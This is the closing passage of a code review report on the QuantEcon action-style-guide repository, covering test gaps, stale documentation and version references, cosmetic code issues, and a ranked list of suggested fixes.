Then run coverage explicitly: `pytest --cov=style_checker --cov-report=html` when you want it, or wire it into CI only.

### 6.5 🟡 Integration tests are skipped by default but their imports are not gated

[tests/test_llm_integration.py:9](tests/test_llm_integration.py#L9) does `from style_checker.reviewer import StyleReviewer`, which transitively does nothing unless instantiated — so this is fine today. But the file at module top has `SAMPLE_LECTURE_WITH_VIOLATIONS = "..."` and a free function `test_sample_lecture_has_violations()` (no marker) at [line 259](tests/test_llm_integration.py#L259). That free function **does** run by default — confirmed it passes.

Not a bug, just inconsistent with the docstring claim "These tests make real LLM API calls." Worth a comment that `test_sample_lecture_has_violations` is the only test in this file that runs without `-m integration`.

### 6.6 🔵 Add a "prompts are identical" assertion test

Until §1.4 (consolidating to a single prompt file) ships, add:

```python
import hashlib
def test_all_category_prompts_are_identical():
    """v0.7.0 design: all 8 category prompts must be byte-identical."""
    from pathlib import Path
    files = list((Path("style_checker") / "prompts").glob("*-prompt.md"))
    hashes = {hashlib.md5(f.read_bytes()).hexdigest() for f in files}
    assert len(hashes) == 1, f"Prompts have drifted: {[f.name for f in files]}"
```

Catches silent drift in CI.

---

## 7. Documentation (P2)

### 7.1 🟡 Examples reference `@v0.3` but docs say `@v0.7`

| File | Reference |
|------|-----------|
| [examples/style-guide-comment.yml:35](examples/style-guide-comment.yml#L35) | `QuantEcon/action-style-guide@v0.3` |
| [examples/style-guide-weekly.yml:20](examples/style-guide-weekly.yml#L20) | `QuantEcon/action-style-guide@v0.3` |
| [docs/user/getting-started.md:33](docs/user/getting-started.md#L33) | `QuantEcon/action-style-guide@v0.7` |
| [docs/user/configuration.md:99](docs/user/configuration.md#L99) | `QuantEcon/action-style-guide@v0.7` |
| [docs/user/github-app-setup.md:86](docs/user/github-app-setup.md#L86) | `QuantEcon/action-style-guide@v0.7` |

Users copy-pasting from `examples/` will get the wrong version. Update examples or, even better, delete them and link to the docs.

### 7.2 🟡 Architecture diagram is stale

[docs/developer/architecture.md:11-45](docs/developer/architecture.md#L11-L45) shows `prompt_loader` as a central component used by `reviewer.py`. As established in §4.1, it isn't. The diagram should either:

- Reflect reality: `reviewer.py` loads prompts directly via `Path.read_text()`.
- Or motivate fixing §4.1 by using `prompt_loader.py` for real.

### 7.3 🟡 Stale doc references in CHANGELOG and contributing guide

[CHANGELOG.md:26](CHANGELOG.md#L26) references `docs/testing-extended-thinking.md` (doesn't exist; the file moved to `docs/developer/extended-thinking.md`). [IMPROVEMENTS.md:19](IMPROVEMENTS.md#L19) references `docs/reports/report-test-action-translation-sync-2026-02-12.md` (the real file is at `.reports/2026-02-12-test-action-translation-sync.md`).

### 7.4 🟡 Contributing guide says to bump `__init__.py` for releases — should be `pyproject.toml`

[docs/developer/contributing.md:114-117](docs/developer/contributing.md#L114-L117):

```
# In __init__.py — bump for every release
__version__ = "0.7.2"
```

If §1.2 is fixed (single source of truth for version), update this guide too.

### 7.5 🟡 `IMPROVEMENTS.md`, `PLAN.md`, `CONTRIBUTING.md` overlap with `docs/`

The repository has top-level `CONTRIBUTING.md` (not read), `IMPROVEMENTS.md`, `PLAN.md`, **and** `docs/developer/contributing.md` and `docs/developer/roadmap.md`. The latter pair are linked from the MyST docs site; the former are not.

Pick one location for each. Suggestion:

- Move `IMPROVEMENTS.md` content into `docs/developer/roadmap.md` (as "completed reliability work") and delete `IMPROVEMENTS.md`.
- Move `PLAN.md` content into the roadmap and delete `PLAN.md`.
- Have top-level `CONTRIBUTING.md` redirect to `docs/developer/contributing.md` (just a one-line link).

This is editorial, but currently a contributor doesn't know whether to read `IMPROVEMENTS.md` or `docs/developer/roadmap.md` and they may not match.

### 7.6 🟡 `README.md` "49 style rules" should auto-derive

The README and rules-reference repeat the magic number 49 (and 32/13/4 by type) in prose. The test suite ([test_reviewer.py:42](tests/test_reviewer.py#L42)) already asserts `total == 49`. Consider generating the table in `rules-reference.md` from the rule files via a tiny `scripts/build-rules-table.py` to prevent drift.

---

## 8. Minor / cosmetic (P2)

### 8.1 `cli.py` width-calculation comments are excellent — keep them. ✅

The `display_width` function ([cli.py:35-52](style_checker/cli.py#L35-L52)) is well-commented and handles the trickiest emoji width edge cases. Nicely done.

### 8.2 Print statements should not contain `Pythagoras` in test fixtures with raw `\sum` ([tests/test_markdown_parser.py:38](tests/test_markdown_parser.py#L38))

The test fixture has `E[X] = \sum_{i=1}^n x_i p_i` inside a regular Python string (not raw). Pytest warns `SyntaxWarning: invalid escape sequence '\s'`. Make those strings raw (`r""" ... """`) or escape the backslashes.

### 8.3 `print` formatting in tests pollutes test output

Many tests print decorative output (`print("\n🤖 Testing with Claude Sonnet 4.5")` etc.). Pytest captures this by default, but it shows up on test failure and bloats CI logs. Either remove these prints or move them to `pytest --capture=no` -only diagnostic helpers.

### 8.4 Tests use both `class TestX:` and bare top-level `def test_*` styles inconsistently

[test_github_handler.py](tests/test_github_handler.py) uses bare top-level functions; [test_cli.py](tests/test_cli.py) uses test classes. Either is fine, but pick one for consistency.

### 8.5 `commit_file` is defined but never called

[style_checker/github_handler.py:188-212](style_checker/github_handler.py#L188-L212) defines `commit_file` (creates a new file). I couldn't find any caller. If unused, delete it.

### 8.6 Triple-backtick code blocks inside `fix_applier.py` warning messages can confuse markdown viewers

Not a code bug, but warning strings like `"Could not find exact match in content (Location: ...)"` end up rendered in PR comments wrapped in code fences. Consider sanitizing or escaping.

### 8.7 `requirements.txt` includes `pytest` and `pytest-cov` as production deps

If you keep `requirements.txt` (don't, per §5.1), at least move test deps to `requirements-dev.txt`.

### 8.8 `format_commit_message` truncates to 10 rules but doesn't link to full list

[github_handler.py:582-593](style_checker/github_handler.py#L582-L593) lists "first 10" rules. For a bulk run with hundreds of fixes, this is lossy. Either include all rules (commit messages can be long) or link to the PR body, which already has the full breakdown.

### 8.9 `from . import __version__` inside functions

[github_handler.py:286, 362, 433, 496](style_checker/github_handler.py#L286) all do `from . import __version__` lazily inside format methods. Move it to the module-top imports — there's no circular import to avoid.

---

## 9. Summary of suggested next moves

Ordered by impact-per-effort:

1. **Fix §1.1 (shell injection)** — single-line `env:` change. ★★★★★
2. **Fix §1.2 (version mismatch)** + §1.3 (PyGithub in pyproject) — adopt `uv` in the same PR (§5.1). ★★★★
3. **Add §1.6 (`lectures_with_issues`)** fix + a test, plus §6.1 (`action.py` test coverage). ★★★★
4. **Fix §1.5 (dead whitespace-fallback)** — replace with a clearer skip warning. ★★★
5. **Consolidate prompts (§1.4)** or add an "identical" test (§6.6). ★★★
6. **Fix §2.2 (API timeout)** + §4.5 (retry/backoff) — one-line `Anthropic(...)` config change. ★★★
7. **Fix §2.3 (narrow exception scope)** — meaningfully changes failure modes. ★★★
8. **Fix §3.1 (apply_fixes position handling)** — pick Option A or B and commit. ★★★
9. **Consolidate `VALID_CATEGORIES` (§4.2)** + delete `prompt_loader.py` (§4.1). ★★
10. **Update examples to `@v0.7` (§7.1)**. ★★
11. **Switch to `uv` (§5.1)** — bundle with §1.2 and §1.3. ★★★★ over time, ★★ effort

Most of items 1–8 are small, surgical changes. The architectural improvements in §4 are larger and aligned with the existing roadmap (`docs/developer/roadmap.md`).

---

*End of review.*
